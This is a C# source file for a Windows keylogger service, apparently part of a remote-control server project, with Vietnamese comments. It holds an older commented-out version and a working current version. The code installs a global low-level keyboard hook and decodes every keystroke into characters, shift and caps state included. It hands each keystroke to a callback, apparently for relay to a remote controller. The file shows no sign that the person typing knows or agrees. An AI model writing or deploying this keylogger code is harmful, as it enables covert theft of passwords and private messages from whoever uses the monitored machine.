// using System;
// using System.Diagnostics;
// using System.Runtime.InteropServices;
// using System.Windows.Forms;

// namespace RemoteControlServer
// {
//     public class KeyLoggerService
//     {
//         // Import các hàm API của Windows
//         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
//         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

//         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
//         [return: MarshalAs(UnmanagedType.Bool)]
//         private static extern bool UnhookWindowsHookEx(IntPtr hhk);

//         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
//         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

//         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
//         private static extern IntPtr GetModuleHandle(string lpModuleName);

//         // Các hằng số định nghĩa Hook bàn phím
//         private const int WH_KEYBOARD_LL = 13;
//         private const int WM_KEYDOWN = 0x0100;

//         // Biến lưu trữ trạng thái Hook
//         private static LowLevelKeyboardProc _proc = HookCallback;
//         private static IntPtr _hookID = IntPtr.Zero;
//         private static Action<string> _callback; // Action gửi phím về Program.cs

//         // --- HÀM START HOOK (Đây là hàm mà Program.cs đang tìm) ---
//         public static void StartHook(Action<string> callback)
//         {
//             _callback = callback;
//             _hookID = SetHook(_proc);
//         }

//         // Hàm dừng Hook
//         public static void StopHook()
//         {
//             UnhookWindowsHookEx(_hookID);
//         }

//         // Thiết lập Hook vào hệ thống
//         private static IntPtr SetHook(LowLevelKeyboardProc proc)
//         {
//             using (Process curProcess = Process.GetCurrentProcess())
//             using (ProcessModule curModule = curProcess.MainModule)
//             {
//                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
//             }
//         }

//         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

//         // Hàm callback: Được gọi mỗi khi có phím nhấn
//         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
//         {
//             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
//             {
//                 int vkCode = Marshal.ReadInt32(lParam);
//                 string key = ((Keys)vkCode).ToString();
                
//                 // Gửi phím về Program.cs thông qua callback
//                 if (_callback != null) _callback(key);
//             }
//             return CallNextHookEx(_hookID, nCode, wParam, lParam);
//         }
//     }
// }

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace RemoteControlServer
{
    public class KeyLoggerService
    {
        // Cấu trúc dữ liệu để lấy cờ (flags) của bàn phím
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int LLKHF_INJECTED = 0x00000010; // Cờ nhận biết phím ảo

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static Action<string> _callback;

        public static void StartHook(Action<string> callback)
        {
            _callback = callback;
            _hookID = SetHook(_proc);
        }

        public static void StopHook()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // Đọc dữ liệu phím chi tiết
                KBDLLHOOKSTRUCT kbStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

                // QUAN TRỌNG: Nếu phím này là phím ảo (do Unikey/Soft bắn ra) -> Bỏ qua
                if ((kbStruct.flags & LLKHF_INJECTED) != 0)
                {
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }

                Keys key = (Keys)kbStruct.vkCode;
                string rawKey = key.ToString();
                string translatedChar = GetCharsFromKeys(key);

                if (_callback != null)
                {
                    _callback($"{rawKey}|||{translatedChar}");
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetCharsFromKeys(Keys key)
        {
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
            bool capsLock = (GetKeyState(0x14) & 0x0001) != 0;

            if (key == Keys.Space) return " ";
            if (key == Keys.Enter) return "<ENTER>";
            if (key == Keys.Back) return "<BACK>";
            if (key == Keys.Tab) return "<TAB>";

            if (key.ToString().Contains("Shift") || key.ToString().Contains("Control") || 
                key.ToString().Contains("Alt") || key.ToString().Contains("Win") || 
                key.ToString().Contains("F") && key.ToString().Length > 1) 
                return "";

            if (key >= Keys.A && key <= Keys.Z)
            {
                bool isUpperCase = shift ^ capsLock;
                return isUpperCase ? key.ToString().ToUpper() : key.ToString().ToLower();
            }

            if (key >= Keys.D0 && key <= Keys.D9)
            {
                string number = key.ToString().Replace("D", "");
                if (!shift) return number;
                switch (number) {
                    case "1": return "!"; case "2": return "@"; case "3": return "#";
                    case "4": return "$"; case "5": return "%"; case "6": return "^";
                    case "7": return "&"; case "8": return "*"; case "9": return "("; case "0": return ")";
                }
            }

            if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
                return key.ToString().Replace("NumPad", "");

            switch (key)
            {
                case Keys.OemPeriod: return shift ? ">" : ".";
                case Keys.Oemcomma: return shift ? "<" : ",";
                case Keys.OemQuestion: return shift ? "?" : "/";
                case Keys.OemMinus: return shift ? "_" : "-";
                case Keys.Oemplus: return shift ? "+" : "=";
                case Keys.Oem1: return shift ? ":" : ";";
                case Keys.Oem7: return shift ? "\"" : "'";
            }
            return "";
        }
    }
}